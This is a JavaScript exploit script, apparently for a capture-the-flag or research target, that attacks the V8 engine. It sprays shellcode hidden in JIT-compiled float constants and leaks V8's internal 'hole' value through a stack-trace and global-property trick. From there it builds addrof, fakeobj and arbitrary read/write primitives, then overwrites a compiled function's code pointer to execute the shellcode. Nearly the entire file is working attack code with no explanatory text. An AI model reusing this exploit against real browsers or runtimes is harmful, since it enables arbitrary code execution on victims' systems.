let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}


// jit spraying

function jit() {
    return [
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112871410787e-246, // 0xceb9050636cb866
        1.9711314215434657e-246, // 0xceb906163782fb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9616425752617766e-246, // 0xceb6e69622f0548
        1.9711832695973408e-246, // 0xceb9090e7894850
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711831018987653e-246, // 0xceb9090c0314890
        1.971112653196158e-246, // 0xceb9050303ab866
        1.9710920957760286e-246, // 0xceb903d59414cb8
        1.9710610293119303e-246, // 0xceb9020e0c14890
        1.9532382542574046e-246, // 0xceb505349440548
        1.971183239760578e-246, // 0xceb9090e0894850
        1.9711128050518315e-246, // 0xceb905053db3148
        1.971182900255075e-246, // 0xceb909090e28948
        1.9710902863710406e-246, // 0xceb903bb0c03148
        -6.828527034370483e-229 // 0x909090909090050f
    ];
}

console.log("[+] JIT spraying...");
for (let i = 0; i < 0x30000; i++) { jit(); } // compile via turbofan


// leak hole

function f() { return stack; }

Error.prepareStackTrace = () => {
    // delete accessor and redefine as normal property
    // because accessor is not handled by JSNativeContextSpecialization::ReduceGlobalAccess()
    delete stack;
    Object.defineProperty(globalThis, "stack", { value: 1, writable: true }); // configurable is false (default)
    stack = {}; // cell_type == kMutable

    for (let i = 0; i < 0x10000; i++) { f(); } // compile via turbofan => code dependency is not installed
}

Error.captureStackTrace(globalThis);
Object.defineProperty(globalThis, "stack", { value: 1, configurable: true });

delete stack;
const the = { hole: f() }; // type of the.hole is HeapConstant


let float_arr;
let obj_arr;

// get (compressed) address of `obj`
function addrof(obj, bool = true) {
    let idx = Number(bool ? the.hole : -1); // real: NaN / optimized: -1
    idx |= 0; // real: 0 / optimized: -1
    idx += 1; // real: 1 / optimized: 0

    float_arr = [1.1];
    obj_arr = [obj];

    return ftoi(float_arr.at(idx * 4)) & 0xffffffffn;
}
let tmp_obj = {};
for (let i = 0; i < 0x30000; i++) { addrof(tmp_obj); } // compile via turbofan

// get fake object at `addr`
function fakeobj(addr, bool = true) {
    let idx = Number(bool ? the.hole : -1); // real: NaN / optimized: -1
    idx |= 0; // real: 0 / optimized: -1
    idx += 1; // real: 1 / optimized: 0

    obj_arr = [tmp_obj];
    float_arr = [itof(addr)];

    return obj_arr.at(idx * 7);
}
let tmp_obj_addr = addrof(tmp_obj);
for (let i = 0; i < 0x30000; i++) { fakeobj(tmp_obj_addr); } // compile via turbofan


let leak_arr;
let float_arr_map;
let empty_properties;

// leak some values
function leak(bool = true) {
    let idx = Number(bool ? the.hole : -1); // real: NaN / optimized: -1
    idx |= 0; // real: 0 / optimized: -1
    idx += 1; // real: 1 / optimized: 0

    leak_arr = [1.1];
    float_arr = [2.2];

    float_arr_map = ftoi(leak_arr.at(idx * 5)) & 0xffffffffn; // PACKED_DOUBLE_ELEMENTS
    empty_properties = ftoi(leak_arr.at(idx * 5)) >> 32n; // JSArray[0]
}
for (let i = 0; i < 0x30000; i++) { leak(); } // compile via turbofan
console.log(`[+] float_arr_map == ${hex(float_arr_map)}`);
console.log(`[+] empty_properties == ${hex(empty_properties)}`);

// read 8-byte from `addr` in sandbox
function read8(addr) {
    let fake_arr_struct = [1.1, 2.2];
    fake_arr_struct[0] = itof(float_arr_map + (empty_properties << 32n)); // map | properties
    fake_arr_struct[1] = itof(addr - 0x8n + (0x2n << 32n)); // elements | length

    let fake_arr_struct_addr = addrof(fake_arr_struct);
    let fake_arr_addr = fake_arr_struct_addr - 0x10n;
    let fake_arr = fakeobj(fake_arr_addr);

    return ftoi(fake_arr[0]);
}

// write 8-byte `value` to `addr` in sandbox
function write8(addr, value) {
    let fake_arr_struct = [1.1, 2.2];
    fake_arr_struct[0] = itof(float_arr_map + (empty_properties << 32n)); // map | properties
    fake_arr_struct[1] = itof(addr - 0x8n + (0x2n << 32n)); // elements | length

    let fake_arr_struct_addr = addrof(fake_arr_struct);
    let fake_arr_addr = fake_arr_struct_addr - 0x10n;
    let fake_arr = fakeobj(fake_arr_addr);

    fake_arr[0] = itof(value);
}


// escape v8 sandbox

let jit_addr = addrof(jit);
console.log(`[+] jit_addr == ${hex(jit_addr)}`);

let code_addr = read8(jit_addr + 0x18n) & 0xffffffffn;
console.log(`[+] code_addr == ${hex(code_addr)}`);

let instruction_start = read8(code_addr + 0x10n);
console.log(`[+] instruction_start == ${hex(instruction_start)}`);
let shellcode_addr = instruction_start + 0x5cn;

// overwrite instruction_start with address of shellcode
write8(code_addr + 0x10n, shellcode_addr);

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
